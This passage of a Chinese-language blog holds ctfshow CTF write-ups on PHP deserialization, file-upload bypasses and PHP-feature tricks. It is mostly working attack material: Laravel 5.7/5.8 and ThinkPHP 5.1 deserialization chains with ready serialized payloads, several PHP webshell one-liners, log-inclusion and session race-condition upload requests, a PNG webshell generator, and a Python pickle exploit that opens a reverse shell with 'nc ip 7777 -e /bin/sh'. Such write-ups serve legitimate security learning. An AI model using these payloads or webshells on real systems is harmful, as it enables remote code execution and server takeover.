echo(base64_encode(serialize($exp)));\n}\n?>\n```\n\n# WEB-271(Laravel5.7反序列化)\n\n直接网上嫖利用链就行了\n\n参考：https://xz.aliyun.com/t/10578#toc-3\n\n```php\n<?php\n\nnamespace Illuminate\\Foundation\\Testing {\n    class PendingCommand\n    {\n        protected $command;\n        protected $parameters;\n        public $test;\n        protected $app;\n        public function __construct($test, $app, $command, $parameters)\n        {\n            $this->app = $app;\n            $this->test = $test;\n            $this->command = $command;\n            $this->parameters = $parameters;\n        }\n    }\n}\n\nnamespace Faker {\n    class DefaultGenerator\n    {\n        protected $default;\n\n        public function __construct($default = null)\n        {\n            $this->default = $default;\n        }\n    }\n}\n\nnamespace Illuminate\\Foundation {\n    class Application\n    {\n        protected $instances = [];\n\n        public function __construct($instances = [])\n        {\n            $this->instances['Illuminate\\Contracts\\Console\\Kernel'] = $instances;\n        }\n    }\n}\n\nnamespace {\n    $defaultgenerator = new Faker\\DefaultGenerator(array(\"DawnT0wn\" => \"1\"));\n    $app = new Illuminate\\Foundation\\Application();\n    $application = new Illuminate\\Foundation\\Application($app);\n    $pendingcommand = new Illuminate\\Foundation\\Testing\\PendingCommand($defaultgenerator, $application, \"system\", array(\"cat /flag\"));\n    echo urlencode(serialize($pendingcommand));\n}\n?>\n```\n\npost:`data=O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7Ds%3A4%3A%22test%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Ba%3A1%3A%7Bs%3A8%3A%22DawnT0wn%22%3Bs%3A1%3A%221%22%3B%7D%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00instances%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00instances%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3Ba%3A0%3A%7B%7D%7D%7D%7D%7D%7D`\n\n# WEB-272~273(Laravel5.8反序列化)\n\npoc如下 参考https://blog.csdn.net/qq_61991235/article/details/123583489?ydreferer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8%3D\n\n```php\n<?php\nnamespace Illuminate\\Broadcasting{\n\n    use Illuminate\\Bus\\Dispatcher;\n    use Illuminate\\Foundation\\Console\\QueuedCommand;\n\n    class PendingBroadcast\n    {\n        protected $events;\n        protected $event;\n        public function __construct(){\n            $this->events=new Dispatcher();\n            $this->event=new QueuedCommand();\n\n        }\n    }\n}\nnamespace Illuminate\\Foundation\\Console{\n    use Mockery\\Generator\\MockDefinition;\n    class QueuedCommand\n    {\n        public $connection;\n        public function __construct()\n        {\n            $this->connection=new MockDefinition();\n        }\n    }\n}\n\nnamespace Mockery\\Generator{\n\n    class MockDefinition{\n        protected $config;\n        protected $code;\n        public function __construct()\n        {\n            $this->code=\"<?php echo system('cat /flag'); exit(); ?>\";\n            $this->config=new MockConfiguration();\n        }\n    }\n    class MockConfiguration{\n        \n    }\n}\n\nnamespace Illuminate\\Bus{\n    use Mockery\\Loader\\EvalLoader;\n    class Dispatcher\n    {\n        protected $queueResolver;\n        public function __construct()\n        {\n            $this->queueResolver=[new EvalLoader(),'load'];\n            //$this->queueResolver=array(new EvalLoader(),'load'); \n            //数组\n        }\n\n    }\n}\n\nnamespace Mockery\\Loader{\n    class EvalLoader{\n\n    }\n}\n\nnamespace{\n\n    use Illuminate\\Broadcasting\\PendingBroadcast;\n\n    echo urlencode(serialize(new PendingBroadcast()));\n}\n?>\n```\n\npost:`data=O%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A25%3A%22Illuminate%5CBus%5CDispatcher%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00queueResolver%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A25%3A%22Mockery%5CLoader%5CEvalLoader%22%3A0%3A%7B%7Di%3A1%3Bs%3A4%3A%22load%22%3B%7D%7Ds%3A8%3A%22%00%2A%00event%22%3BO%3A43%3A%22Illuminate%5CFoundation%5CConsole%5CQueuedCommand%22%3A1%3A%7Bs%3A10%3A%22connection%22%3BO%3A32%3A%22Mockery%5CGenerator%5CMockDefinition%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00config%22%3BO%3A35%3A%22Mockery%5CGenerator%5CMockConfiguration%22%3A0%3A%7B%7Ds%3A7%3A%22%00%2A%00code%22%3Bs%3A42%3A%22%3C%3Fphp+echo+system%28%27cat+%2Fflag%27%29%3B+exit%28%29%3B+%3F%3E%22%3B%7D%7D%7D`\n\n# WEB-274(thinkPHP5.1反序列化)\n\n看到界面就很熟悉一眼丁真是thinkphp\n\n```php\n<?php\nnamespace think;\nabstract class Model{\n    protected $append = [];\n    private $data = [];\n    function __construct(){\n        $this->append = [\"ethan\"=>[\"dir\",\"calc\"]];\n        $this->data = [\"ethan\"=>new Request()];\n\t}\n}\nclass Request\n{\n    protected $hook = [];\n    protected $filter = \"system\";\n    protected $config = [\n    'var_method'       => '_method',// 表单请求类型伪装变量\n    'var_ajax'         => '_ajax',// 表单ajax伪装变量\n    'var_pjax'         => '_pjax',// 表单pjax伪装变量\n    'var_pathinfo'     => 's',// PATHINFO变量名 用于兼容模式\n    'pathinfo_fetch'   => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],// 兼容PATH_INFO获取\n    'default_filter'   => '',// 默认全局过滤方法 用逗号分隔多个\n    'url_domain_root'  => '',// 域名根，如thinkphp.cn\n    'https_agent_name' => '',// HTTPS代理标识\n    'http_agent_ip'    => 'HTTP_X_REAL_IP',// IP代理获取标识\n    'url_html_suffix'  => 'html',// URL伪静态后缀\n    ];\n    function __construct(){\n        $this->filter = \"system\";\n        $this->config = [\"var_ajax\"=>''];\n        $this->hook = [\"visible\"=>[$this,\"isAjax\"]];\n    }\n}\nnamespace think\\process\\pipes;\nuse think\\model\\concern\\Conversion;\nuse think\\model\\Pivot;\nclass Windows\n{\n    private $files = [];\n    public function __construct()\n    {\n    \t$this->files=[new Pivot()];\n    }\n}\nnamespace think\\model;\nuse think\\Model;\nclass Pivot extends Model\n{\n}\nuse think\\process\\pipes\\Windows;\necho base64_encode(serialize(new Windows()));\n?>\n```\n\npayload:\n\n```\n?data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJldGhhbiI7YToyOntpOjA7czozOiJkaXIiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJldGhhbiI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mzp7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo5O2k6MTtzOjY6ImlzQWpheCI7fX1zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO3M6OToiACoAY29uZmlnIjthOjE6e3M6ODoidmFyX2FqYXgiO3M6MDoiIjt9fX19fX0=&shell=cat /flag\n```\n\n# WEB-275\n\n这道题有个逻辑错误 一开始我还以为关键在于`copy($_GET['fn'],md5(mt_rand()).'.txt');`\n\n这道题目问题是将我们木马文件赋值到一个随机文件中 然后把我们的文件删了 \n\n本来想是在他删除我们文件之前利用重定向 将flag读到别的文件中 之后发现不行 没有权限好像\n\n看了眼wp 返现纯纯的逻辑问题 直接利用析构函数里的system 拼接命令即可\n\npayload:\n\n```php\n?fn=;cat f*\npost:flag=1\n```\n\n# WEB-276(phar反序列化)\n\n首先这道题目增加了一个admin 想进入析构函数执行system则必须修改这个admin\n\n那么就需要进行反序列化 但是题目并没有给我们反序列化的函数\n\n然后看了wp就是通过phar来进行的 \n\n首先上传一个文件然后内容是phar生成的内容(包含我们的恶意序列化内容) 这是一个固定格式 我之前总结过这里就不赘述了\n\n但是一开始我最大的问题 我们上传的文件需要配合phar://协议 然后我们的恶意内容才会进行反序列化\n\n在哪里利用phar://呢 然后又检索了一番 原来是我们上传上去之后 脚本源码是通过unlink函数进行删除我们上传的文件的 刚好这个unlink函数就可以配合phar://协议将我们的恶意内容反序列化 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688626698460-3d19f897-bf37-42d3-9f43-4837397627db.png)\n\n因此这里需要条件竞争 一个包一直发上传phar序列化内容的包 另一个包一直发phar://协议访问我们上传文件的包\n\n但是不知道是我哪里不对，还是题目环境问题，不管是自己发包还是别人的poc，我一直没成功，不过明白怎么做就ok了，思路最重要。\n\n然后受影响的函数有这些\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688626857137-67729b1e-5c69-4be4-bad3-918e41ebd0d4.png)\n\n偷的：https://paper.seebug.org/680/\n\n\n\n# WEB-277 288（python）\n\n常规反序列化 \n\n查看源码`#--/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m)`\n\nEXP如下：\n\n```python\nimport base64\nimport pickle\n#--/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m)\nclass EXP():\n    def __reduce__(self):\n        return(eval, (\"__import__('os').popen('nc ip 7777 -e /bin/sh')\",))\nexp = EXP()\na = pickle.dumps(exp)\nprint(base64.b64encode(a))\n```\n\n\n\n# 尾巴：\n\n至此 即将进军java模块 当然准备开始学习java！冲就完了\n","tags":["反序列化"],"categories":["ctfshow"]},{"title":"ctfshow-文件上传","url":"/post/c5a854c1.html","content":"\nctfshow-文件上传\n\n<!--more-->\n\n# WEB-151(前端验证)\n\n上传png后缀的 然后抓包改回php即可\n\n# WEB-152(后端Content-Type校验)\n\n Content-Type是返回消息中非常重要的内容，表示后面的文档属于什么MIME类型。  \n\n所以跟151做法一样 先上传png然后bp改后缀即可\n\n参考：\n\nhttps://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types\n\nhttps://segmentfault.com/a/1190000013056786\n\n# WEB-153（.user.ini）\n\n前两种通过修改后缀这里不能用了\n\n访问/upload 发现有内容nothing here 然后可以猜到这里有/uplaod/index.php \n\n那么目标就很明确了 我们上传的路径下有一个现成的php文件 理所当然想到通过上传.user.ini来做这道题\n\n但是.htaccess只是适用于apache，如果变成niginx或者iis则不会被解析  \t\n\n通过报错我们可以看到题目环境中间件是nginx 但是这也不影响我们用.user.ini\n\n因为只要用了fastcgi我们就可以用.user.ini\n\nFastCGI常用于将Web服务器（如Nginx、Apache）与应用程序（如PHP、Python、Ruby）进行集成，以提供动态内容的生成和处理能力。它是一种高性能、灵活和可扩展的Web应用程序交互协议。  \n\n.user.ini:\n\n.user.ini也是php的一种配置文件，众所周知php.ini是php的配置文件，它可以做到显示报错，导入扩展，文件解析，web站点路径等等设置。但是如果想要把某个文件里面的配置与全局的php.ini不同，则可以在php文件中加上ini_set()来配置特定的配置变量。\n\n而.user.ini和.htaccess一样是对当前目录的所以php文件的配置设置，即写了.user.ini和它同目录的文件会优先使用.user.ini中设置的配置属性。\n\n偷的https://www.cnblogs.com/sijidou/p/13121301.html\n\n简单理解就是php的配置文件它可以设置一些配置 比如怎么去解析我们上传的文件一类的\n\n内容:\n\n```php\n//.user.ini\n\nauto_prepend_file=top.html\nauto_append_file=down.html\n```\n\n怎么理解？\n\n就是把我们指定的文件包含进宿主php文件中 利用其实本质就是用require()去包含我们的恶意文件并且即使后缀不是php文件也可被当作php文件来解析\n\n这里require()完全就是include()函数一样\n\n一个是宿主php文件头部去包含 一个是尾部两者皆可\n\n先将.user.ini增加后缀png然后抓包去除 在上传我们指定的恶意文件\n\n这时我们前面已经说的很清楚了 直接访问/upload/index.php 这样我们的木马就被包含在这个index.php文件中了而不是直接去访问我们的木马文件\n\n可以看到 已经包含在头部了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688359146297-fb9749ff-2ad8-4a8d-b933-10f21f0d0931.png)\n\n# WEB-154~155（.user.ini+短标签）\n\nwaf了文件内容php字样\n\n用短标签bypass即可 \n\n```php\n<?=@eval($_POST[x]);?>\n```\n\n# WEB-156([]绕过)\n\n在154~155基础上过滤了`[]`用`{}`bypass\n\n```\n<?=@eval($_POST{x});?>\n```\n\n# WEB-157~159({} ; ()绕过)\n\n在前面基础上过滤了{}和分号 那我们不写一句话了 直接命令执行读flag\n\n```\n<?=`tac ./../f*`;?>` 或者`<?=system('tac ../f*')?>\n```\n\n159不行 过滤了括号只能用第一种 \n\n# WEB-160(日志包含 绕log)\n\n`<?=include\"/var/lo\".\"g/nginx/access.lo\".\"g\"?>`log用拼接绕过\n\n然后文件头User-Agent包含一句话木马即可\n\n# WEB-161(文件头检测绕过)\n\n在160基础上增加了检测文件头的函数 增加图片头GIF89a绕过即可\n\ngetimagesize(): 会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688365737442-53a194dd-aeea-4986-ba00-86ec08a101d4.png)\n\n其实GIF89a就是我们一般见到的gif动图的文件头\n\n通过010对一个gif图分析就能看到文件头\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688444635540-b95e7f67-b6d6-4d61-9ecd-040a9d0124a4.png)\n\n# WEB-162~163(session 条件竞争)\n\n之前别的模块做过类似的\n\n```php\n<!DOCTYPE html>\n<html>\n<body>\n<form action=\"http://953ea87b-dff4-45be-adac-15a38b1fd7e3.challenge.ctf.show/\" method=\"POST\" enctype=\"multipart/form-data\">\n    <input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123\" />\n    <input type=\"file\" name=\"file\" />\n    <input type=\"submit\" value=\"submit\" />\n</form>\n</body>\n</html>\n```\n\n上传一个文件改数据包：\n\n加上木马和`Cookie:PHPSESSID=ban`\n\n```php\nPOST / HTTP/1.1\nHost: 953ea87b-dff4-45be-adac-15a38b1fd7e3.challenge.ctf.show\nContent-Length: 352\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: null\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarybDQ9C8w3UWP0rUGY\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nCookie:PHPSESSID=ban\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\n\n------WebKitFormBoundarybDQ9C8w3UWP0rUGY\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\n\n<?php system('cat ../f*');?>\n------WebKitFormBoundarybDQ9C8w3UWP0rUGY\nContent-Disposition: form-data; name=\"file\"; filename=\"1.png\"\nContent-Type: image/png\n\nGIF89a\n<?=include\"/var/lo\".\"g/nginx/access.lo\".\"g\"?>\n\n\n------WebKitFormBoundarybDQ9C8w3UWP0rUGY--\n```\n\n然后再将.user.ini改为\n\n```php\nGIF89a\nauto_prepend_file=/tmp/sess_ban\n```\n\n然后两个条件竞争一直发包即可\n\n# WEB-164（PNG 二次渲染）\n\n随便上传一个图片 然后我们可以访问`http://6a0dd0db-7621-467f-8c76-dd8bd63732b6.challenge.ctf.show/download.php?image=32d3ca5e23f4ccf1e4c8660c40e75f33.png` 可以看到是通过文件包含形式\n\n二次渲染就是我们夹杂在图像里的木马上传后会被删掉 我们需要下载下来找到它不删除的地方把我们的木马加进去然后利用文件包含执行我们的木马\n\n因为我的php是8.2.0的版本 修改ini文件 `extension=gd`把前面的`;`去掉\n\n然后才能用这个脚本\n\n```php\n<?php\n$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,\n            0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,\n            0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,\n            0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,\n            0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,\n            0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,\n            0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,\n            0x66, 0x44, 0x50, 0x33);\n\n$img = imagecreatetruecolor(32, 32);\n\nfor ($y = 0; $y < sizeof($p); $y += 3) {\n    $r = $p[$y];\n    $g = $p[$y+1];\n    $b = $p[$y+2];\n    $color = imagecolorallocate($img, $r, $g, $b);\n    imagesetpixel($img, round($y / 3), 0, $color);\n}\n\nimagepng($img,'1.png');  //要修改的图片的路径 \n\n/* 木马内容\n<?$_GET[0]($_POST[1]);?>\n */\n//imagepng($img,'1.png');  要修改的图片的路径,1.png是使用的文件，可以不存在\n//会在目录下自动创建一个1.png图片\n//图片脚本内容：$_GET[0]($_POST[1]);\n//使用方法：例子：查看图片，get传入0=system；post传入tac flag.php\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688451112419-1980ecb8-25aa-44d8-b6fe-14b539de29fc.png)\n\n可以看到木马是以短标签写进去的\n\n抓包执行即可\n\n\n\n```php\nPOST /download.php?image=4a47a0db6e60853dedfcfdf08a5ca249.png&0=system HTTP/1.1\nHost: 6a0dd0db-7621-467f-8c76-dd8bd63732b6.challenge.ctf.show\nContent-Length: 14\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nOrigin: http://6a0dd0db-7621-467f-8c76-dd8bd63732b6.challenge.ctf.show\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://6a0dd0db-7621-467f-8c76-dd8bd63732b6.challenge.ctf.show/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: _ga=GA1.2.729509020.1680361470\nConnection: close\n\n1=cat+flag.php\n```\n\n# WEB-165(jpg二次渲染)\n\n傻逼题 没啥好说的\n\n# WEB-166(zip)\n\n给zip后面添加一句话上传 然后包含执行 题目环境有问题 返回包是空的\n\n# WEB-167(.htaccess)\n\n报500错误 环境有问题 无语了\n\n.htaccess也是php的配置文件 是一个局部配置文件 只对该文件所在目录下的文件起作用\n\n我们可以上传上去jpg文件 但是不是php文件 无法解析\n\n所以我们需要.htaccess这个文件去将我们的jpg文件解析成php文件 \n\n内容：\n\n```php\n<FilesMatch \"1.jpg\"> //需要解析的文件名\nSetHandler application/x-httpd-php\n</FilesMatch>\n```\n\n# WEB-168(免杀)\n\n过滤了eval get post system\n\npaylaod:\n\n```php\n<?=`$_REQUEST[1]`;?>\n<?php echo `$_REQUEST[x]`;?>\n<?php $_REQUEST[1]($_REQUEST[2]);?>\n<?php $a='syste'.'m';($a)('ls ../');    //拼接\n```\n\n当时用反引号做的时候一直在想为什么返回包是空白 后来才想到这个反引号没有回显 要用echo一下 或者搭配短标签\n\n# WEB-169~WEB-170(日志包含)\n\n可以上传php文件到upload下然后上传user.ini 里面的内容指向nginx的日志文件 然后请求头写入一句话木马 去包含访问即可\n\n# 结尾：\n\n真被某些题环境搞心态了 \n\n继续下一大陆 sql注入！！！！！！！！！！！！！！！！！！！\n\n# \n","tags":["文件上传"],"categories":["ctfshow"]},{"title":"ctfshow-php特性","url":"/post/61d76257.html","content":"\nctfshow-php特性\n\n<!--more-->\n\n# WEB-89(数组绕正则)\n\n需要我们输入数字但是正则匹配不能输入数字 通过数字bypass preg_match()即可\n\n```\n?num[]=1\n```\n\n# WEB-90,92(intval十六进制)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688001800190-41a53fa2-0b5d-493c-87c5-1a02b998984b.png)\n\n用16进制即可\n\n```\n?num=0x117c\n```\n\n# WEB-91(多行匹配绕过)\n\n```\npreg_match('/^php$/im', $a)\n```\n\n`^`:匹配php开头\n\n`$`:匹配php结尾\n\n`i`：大小写\n\n`m`:多行匹配\n\n所以用换行符`%0a`绕过就行\n\n```\n?cmd=a%0aphp\n```\n\n# WEB-93(intval八进制)\n\n和90，92一样不过这次waf了字母用八进制bypass即可\n\n```\n?num=010574\n```\n\n# WEB-94(intval小数点)\n\n不能0开头也就不能用八进制了，用小数点即可\n\n```\n?num=4476.0\n```\n\n# WEB-95(intval空格)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688004410684-16da55e9-452a-47f0-81d4-7bc609301c4f.png)\n\n```\n?num=+010574\n?num= 010574\n?num=%20010574\n```\n\n# WEB-96(路径)\n\n```\n?u=./flag.php\n```\n\n`./`表示当前路径下\n\n# WEB-97(md5)\n\n经典题型了，不多说\n\n数组 或者 直接去找0e开头的payload都可以\n\npost:`a[]=1&b[]=2`\n\n# WEB-98(三元运算符)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688091408059-222ec5ac-7d19-4d00-81d7-ed3ad0903d6d.png)\n\n不用管中间的 只看第一行和第二行\n\n当我们提交一个get传参就会让其等于post传参的值 这里用到了取地址符 直接用c的知识去理解就行了\n\n```\n$_GET?$_GET=&$_POST:'flag';\nhighlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);\n```\n\n所以payload:\n\n```\n?HTTP_FLAG=flag\npost:HTTP_FLAG=flag\n```\n\n# WEB-99(in_array)\n\n主要是in_array这个函数 这个函数是检测一个字符是否在一个数组中 \n\n如果这个函数不设置第三个参数 则表示在检测中不会检查要检测的值是否与数组中的值类型相同 并且自动转换\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688093098547-696073aa-4215-4dea-8a30-947858c0ce4f.png)\n\n所以我们输入1.php最后也被会认为是1\n\n```\npayload:?n=1.php\npost:content=<?php @eval($_POST[x]);\n```\n\n# WEB-100(运算符优先级)\n\n```\n&& > || > = > and > or\n```\n\n=的运算符比and高\n\n对于v0的值只需要看v1就可以v2,v3是干扰\n\n```\n?v1=1&v2=print_r($ctfshow)&v3=;\n```\n\n# WEB-101(反射类)\n\n反射类之前做题有遇到过\n\n原理：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688094287598-543d0f24-a471-4c46-9e78-ea12c3a25e91.png)\n\n一个简单的demo来理解payload\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688094259742-560322f7-8861-4ca4-ab38-e3ac4bf26c9a.png)\n\npayload：`?v1=1&v2=echo new Reflectionclass&v3=;`\n\n# WEB-102~103(hex2bin)\n\n利用数字 hex2bin()函数 写shell\n\n然后再用伪协议base64写解码 将shell写进去 \n\n```php\n<?=`cat *`;\n```\n\npayload给的通过base64编码在转为16进制 刚好为纯数字 其他的payload可能夹杂字母 挺巧妙的\n\n```php\n?v2=115044383959474e6864434171594473&v3=php://filter/write=convert.base64-\ndecode/resource=1.php\npost：v1=hex2bin\n```\n\n# WEB-104，106(弱相等)\n\n网上随便找0e开头的值即可\n\n```\n?v2=aaK1STfY\n```\n\npost `v1=aaO8zKZF`\n\n# WEB-105(变量覆盖)\n\n出口其实是这里 一开始没弄明白 其实题目一开始进去内容就是error报出来的 真该死啊我\n\n```php\nif(!($_POST['flag']==$flag)){\n    die($error);\n}\n```\n\n `?suces=flag`\n\npost：`error=suces`\n\n# WEB-107（parse_str）\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688102102333-8c35f4a6-9b9e-4b2a-a1b0-747d250d7998.png)\n\n一个逻辑问题\n\npost:`v1=flag=0cc175b9c0f1b6a831c399e269772661`\n\n```\n?v3=a\n```\n\n其中散列值是a的md5值\n\n# WEB-108(ereg绕过)\n\nereg 是一个已经过时的函数，用于进行正则表达式的匹配。它用于检查给定的字符串是否与指定的正则表达式模式匹配。  \n\n在php5.3.0标记为过时并且在7.0.0完全移除\n\n他的功能就被preg_match代替\n\nereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配。\n\n```\n?c=a%00778\n```\n\n# WEB-109(Exception类)\n\n发现这个反射类和异常类还能配合命令执行函数一起用真的长见识了\n\n## 方法一 反射类\n\n```\n?v1=ReflectionClass&v2=system('cat fl36dg.txt')\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688103095547-7f1b0169-dc56-4574-8e5c-450fa942d6c9.png)\n\n## 方法二 异常类\n\n```\n?v1=Exception&v2=system(\"ls\")\n```\n\n# WEB-110 (原生类)\n\n`?v1=FilesystemIterator&v2=getcwd`然后直接访问flag文件就行了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688105770334-d07ff653-1866-418e-91e6-d62e41619def.png)\n\ngetcwd获得当前目录之后传入FilesystemIterator 遍历指定路径文件系统中的目录和文件  \n\n不过如果想遍历需要不断的移动指针不然只会显示当前目录下的第一个文件\n\n当然这道题目够用了\n\n# WEB-111(全局变量)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688106245109-cf261e28-2259-43a2-9e3d-265ab8a40493.png)\n\n`?v1=ctfshow&v2=GLOBALS`学到了\n\n# WEB-112,114（伪协议）\n\n```php\nphp://filter/resource=flag.php\nphp://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php\nphp://filter/read=convert.quoted-printable-encode/resource=flag.php\ncompress.zlib://flag.php\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688106680369-5ac1b3d9-64c6-427e-a427-671e9b461c49.png)\n\n# WEB-113(软链接)\n\n```\n?file=compress.zlib://flag.php\n```\n\n或者\n\n```php\n?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p\nroc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro\nc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/\nself/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se\nlf/root/proc/self/root/var/www/html/flag.php\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688107482764-a9e34e0f-7270-4035-9c8f-457502df220b.png)\n\n/proc/self/root其实是指向根目录的软链接 \n\n看别人的WP说是 超过20次软连接后就可以绕过is_file\n\n不太懂 挺神奇的\n\n# WEB-114(%0c)\n\n```\n?num=%0c36\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688108120944-d14869fb-39e4-4703-bd79-2872e2072781.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688108142156-8b475290-13f0-4a7b-93e1-2e4a50541c91.png)\n\n# WEB-123(php命名规则)\n\n老生常谈了 php合法命名规则是字母数字下划线其他字符会被替换为_\n\npost:`CTF_SHOW=1&CTF[SHOW.COM=1&fun=echo $flag`\n\n但是如果出现`[`则这个符号被替换为`_`之后的不合法字符都不会被替换\n\n\n\n# WEB-125(highlight_file)\n\npost：`CTF_SHOW=1&CTF[SHOW.COM=1&fun=highlight_file($_GET[1])`\n\n```\n?1=flag.php\n```\n\n但是不知道为什么inlcude show_source不行 奇怪\n\n# WEB-126($_SERVER['argv'])\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688109739182-2e95e334-c1c5-4c24-bb86-a83cdf262a1a.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688110255660-5da2293b-64eb-46eb-9528-cafd71b8f5a9.png)\n\n```php\nGET:?a=1+fl0g=flag_give_me\nPOST:CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[1])\nGET:?$fl0g=flag_give_me\nPOST:CTF_SHOW=&CTF[SHOW.COM=&fun=assert($a[0])\n这里fl0g要加$原因是起到一个定义变量赋值的作用\n```\n\n\n\n# WEB-127($_SERVER['QUERY_STRING'])\n\n`?ctf show=ilove36d`还是命名问题 空格会被替换为_从而绕过waf\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688110594778-30b57f7d-7907-40eb-93cc-8a4a470c1d8c.png)\n\n# WEB-128（ 